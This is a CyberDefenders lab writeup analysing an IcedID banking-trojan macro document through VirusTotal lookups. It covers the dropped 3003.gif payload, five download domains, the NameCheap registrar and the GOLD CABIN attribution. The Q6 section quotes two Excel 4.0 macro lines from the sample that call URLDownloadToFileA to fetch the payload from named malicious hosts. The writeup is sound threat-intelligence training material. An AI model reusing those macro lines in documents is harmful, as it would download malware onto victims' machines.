# IcedID - CyberDefenders Writeup

**Category:** Threat Intelligence / Malware Analysis  
**Platform:** CyberDefenders  
**Threat Actor:** GOLD CABIN  
**Malware Family:** IcedID (BokBot)  
**Tools:** VirusTotal, Any.Run, Threat Intelligence Repositories  

---

## Connected Investigations
- **Threat Actor & Intel Pivoting:**
  - [CyberDefenders: REvil - GOLD SOUTHFIELD Lab](<../REvil - GOLD SOUTHFIELD Lab/Writeup.md>) — Tracking ransomware operations attributed to threat group GOLD SOUTHFIELD.
  - [CyberDefenders: Yellow RAT lab](<../Yellow RAT lab/Writeup.md>) — Pivoting on file hashes, dropped payloads, and sandbox behavior.
  - [CyberDefenders: Dana Bot Lab](<../Dana Bot Lab/Writeup.md>) — Triage of stage-1 droppers and secondary payload retrieval.

---

## Scenario Overview

This investigation analyzes an initial access sample associated with the **IcedID** (also known as BokBot) banking trojan and loader. By querying file hashes against VirusTotal and malware sandboxes, we identify the malicious macro document name, dropped secondary payload files, contacting C2 domains, dominant domain registrars, the attributed threat actor (**GOLD CABIN**), and the Win32 API function leveraged by Excel 4.0 macros to download external payloads.

---

## Walkthrough

### Q1 — File Name Associated with Given Hash

Looking up the provided sample hash in VirusTotal under the **Details** tab and inspecting the **Names** section:

![VirusTotal Details tab showing associated filenames](Assets/Pasted%20image%2020260729230844.png)

> **Question:** What is the name of the file associated with the given hash?  
> **Answer:** `document-1982481273.xlsm`

---

### Q2 — Dropped Secondary GIF Payload Filename

Navigating to the **Relations** tab in VirusTotal and reviewing the **Dropped Files** list:

![VirusTotal Relations tab showing dropped files](Assets/Pasted%20image%2020260729231205.png)

A secondary payload disguised with a `.gif` extension is dropped onto the endpoint:

> **Question:** Can you identify the filename of the GIF file that was deployed?  
> **Answer:** `3003.gif`

---

### Q3 — Number of Domains Hosting the Additional Payload

Reviewing the **Contacted URLs** section for external URLs requesting `3003.gif`:

![Contacted URLs hosting 3003.gif](Assets/Pasted%20image%2020260729231902.png)

The malware references 5 distinct domains (`metaflip.io`, `partsapp.com.br`, `columbia.aula-web.net`, `tajushariya.com`, `agenbolatermurah.com`) to retrieve the payload:

> **Question:** How many domains does the malware look to download the additional payload file in Q2?  
> **Answer:** `5`

---

### Q4 — Dominant DNS Registrar Used by Threat Actor

Performing WHOIS lookups on the domains identified in Q3 reveals that `tajushariya.com` and other malicious domains were registered through:

![WHOIS domain registrar details](Assets/Pasted%20image%2020260729232150.png)

> **Question:** From the domains mentioned in Q3, a DNS registrar was predominantly used by the threat actor to host their harmful content, enabling the malware's functionality. Can you specify the Registrar INC?  
> **Answer:** `NameCheap`

---

### Q5 — Threat Actor Linked to Sample

Researching threat intelligence profiles and threat actor taxonomies associated with this campaign:

![Threat group description identifying GOLD CABIN](Assets/Pasted%20image%2020260729232752.png)

The activity is attributed to the cybercrime syndicate tracked as **GOLD CABIN**:

> **Question:** Could you specify the threat actor linked to the sample provided?  
> **Answer:** `Gold Cabin`

---

### Q6 — Win32 API Function Used to Fetch Extra Payloads

Analyzing the extracted Excel 4.0 (`xlm4.0`) macro decompilation:

![Extracted malware config showing XLM macro execution](Assets/Pasted%20image%2020260729234724.png)

```text
=CALL("URLMon", "URLDownloadToFileA", "JCCB", 0, "https://metaflip.io/ds/3003.gif", "..\ksjvoefv.skd")
=CALL("URLMon", "URLDownloadToFileA", "JCCB", 0, "https://partsapp.com.br/ds/3003.gif", "..\ksjvoefv.skd1")
```

The macro calls `URLDownloadToFileA` from the `urlmon.dll` library to silently download the disguised payload from the remote servers to disk:

> **Question:** In the Execution phase, what function does the malware employ to fetch extra payloads onto the system?  
> **Answer:** `URLDownloadToFileA`

---

## Summary of Key Findings

| Artifact | Value |
| :--- | :--- |
| **Weaponized Macro File** | `document-1982481273.xlsm` |
| **Disguised Payload** | `3003.gif` |
| **Download Domains Count** | `5` |
| **Primary Registrar** | `NameCheap` |
| **Threat Actor** | `Gold Cabin` |
| **Download API Function** | `URLDownloadToFileA` (`urlmon.dll`) |
